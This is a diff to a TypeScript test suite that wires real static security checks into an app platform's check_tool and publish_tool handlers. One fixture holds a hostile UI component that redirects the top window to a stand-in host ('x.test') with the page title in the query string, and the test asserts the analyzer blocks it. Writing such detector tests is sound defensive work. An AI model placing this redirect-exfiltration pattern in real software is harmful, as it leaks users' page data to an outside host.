@@ -13,6 +13,8 @@
 // Run: pnpm --filter @visvine/web exec node --import tsx --test tests/tools-mcp.test.ts
 
 import test from 'node:test'
+import type { CheckReport } from '@/lib/tools/checks/findings'
+import { runStaticChecks } from '@/lib/tools/checks/analyze'
 import assert from 'node:assert/strict'
 import { ActionError, type ActionCaller } from '@/lib/actions/types'
 import { appToolHandlers, type AppToolDeps } from '@/lib/actions/defs/apps'
@@ -81,9 +83,16 @@ function build(over: Partial<BuildSummary> = {}): BuildSummary {
     config: config(),
     configError: null,
     updatedAt: '2026-08-18T00:00:00.000Z',
+    sourceHash: 'hash_1',
     iconSvg: null,
     ...over,
   }
+}
+
+/** A report with nothing in it — what a clean Tool publishes with. */
+const CLEAN_REPORT: CheckReport = {
+  compatibility: { stage: 'compatibility', status: 'passed', findings: [], analyzer: 'static-1', durationMs: 1 },
+  security: { stage: 'security', status: 'passed', findings: [], analyzer: 'static-1', durationMs: 1 },
 }
 
 /** A build that failed the way a typo in ui.tsx fails. */
@@ -198,6 +207,8 @@ function deps(over: Partial<AppToolDeps> = {}): AppToolDeps {
     spaceFacts: unexpected('spaceFacts'),
     appOrigin: () => 'https://visvine.test',
     capturePreview: unexpected('capturePreview'),
+    // The real rules, unrecorded: what check_tool reports is what they find.
+    checkWorkingCopy: async (_spaceId, _name, _hash, input) => runStaticChecks(input),
     ...over,
   } as AppToolDeps
 }
@@ -403,10 +414,14 @@ test('check_tool rebuilds and reports perimeter, requirements, surfaces and warn
   assert.equal(result.requirements.degraded_here, true)
   assert.deepEqual(result.requirements.missing, ['No connector in this space matches hubspot'])
   assert.ok(
-    result.warnings.some((w) => w.includes('downgrade it to a tab')),
+    result.warnings.some((w) => w.includes('installs as a tab')),
     `expected a page-claim warning, got ${JSON.stringify(result.warnings)}`,
   )
-  assert.equal(result.ready_to_publish, false)
+  // Declared and never used: said, so an admin is not asked to approve reach it never exercises.
+  assert.ok(result.warnings.some((w) => /Declares connectors \(hubspot\) it never calls/.test(w)))
+  // Flags are for the admin who approves; nothing here stops a publish.
+  assert.equal(result.checks.status, 'flagged')
+  assert.equal(result.ready_to_publish, true)
 })
 
 test('check_tool warns about an empty perimeter and a missing description', async () => {
@@ -423,15 +438,14 @@ test('check_tool warns about an empty perimeter and a missing description', asyn
       }),
     }),
   )
-  assert.equal(result.warnings.length, 2)
-  assert.ok(result.warnings.some((w) => w.includes('perimeter is empty')))
-  assert.ok(result.warnings.some((w) => w.includes('`description:`')))
+  assert.deepEqual(result.warnings, ['low: index.md — No description — it is what About and the install sheet show'])
+  assert.ok(result.checks.notes.some((line) => line.includes('Declares no reach')))
   assert.deepEqual(result.perimeter, [
     'Declares no reach — this tool reads and writes no space data',
   ])
 })
 
-test('check_tool says ready_to_publish only when it compiles and lints clean', async () => {
+test('check_tool says ready_to_publish only when nothing blocks', async () => {
   const clean = await appToolHandlers.checkTool(
     CTX,
     { space_id: SPACE, name: 'board' },
@@ -460,6 +474,28 @@ test('check_tool says ready_to_publish only when it compiles and lints clean', a
   )
   assert.equal(broken.ready_to_publish, false)
   assert.deepEqual(broken.build.errors, ['ui.tsx:12:5 Expected "}" but found "<"'])
+  assert.deepEqual(broken.checks.blocking, ['ui.tsx:12 — Expected "}" but found "<"'])
+
+  const hostile = await appToolHandlers.checkTool(
+    CTX,
+    { space_id: SPACE, name: 'board' },
+    deps({
+      describeAuthoredTool: async () =>
+        detail({
+          sources: {
+            'index.md': '---\ntype: tool\n---\n',
+            'ui.tsx': 'export default function App() {\n  window.top.location.href = "https://x.test/?d=" + document.title\n  return null\n}',
+            'data.js': null,
+            'icon.svg': null,
+          },
+        }),
+      rebuild: async () => build(),
+      spaceFacts: async () => ({ available: { connectors: [], types: [], agents: [] }, customTypes: [] }),
+    }),
+  )
+  assert.equal(hostile.ready_to_publish, false)
+  assert.equal(hostile.checks.security, 'blocked')
+  assert.ok(hostile.checks.blocking.some((line) => line.startsWith('ui.tsx:2 — Reaches top')))
 })
 
 // ── list / preview / sdk ─────────────────────────────────────────────────────
@@ -575,7 +611,7 @@ test('publish_tool explains the review gate and passes the note through', async 
     deps({
       publishTool: async (_p, _c, name, opts) => {
         notes.push([name, opts.note])
-        return { ok: true, version: version(), warning: null }
+        return { ok: true, version: version(), warning: null, report: CLEAN_REPORT }
       },
     }),
   )
@@ -603,6 +639,7 @@ test('publish_tool carries the version-bump warning rather than hiding it', asyn
         ok: true,
         version: version(),
         warning: 'Published as version 3, but tools/board/index.md could not be updated.',
+        report: CLEAN_REPORT,
       }),
     }),
   )
@@ -958,6 +995,7 @@ test('publish_tool passes release_notes through and echoes tags and notes back',
           ok: true,
           version: version({ tags: ['crm', 'kanban'], releaseNotes: 'Adds the archive column' }),
           warning: null,
+          report: CLEAN_REPORT,
         }
       },
     }),
@@ -976,6 +1014,7 @@ test("publish_tool says an admin's publish is live here — and still not public
         ok: true,
         version: version({ status: 'approved', reviewNote: 'published by an admin' }),
         warning: null,
+        report: CLEAN_REPORT,
       }),
     }),
   )
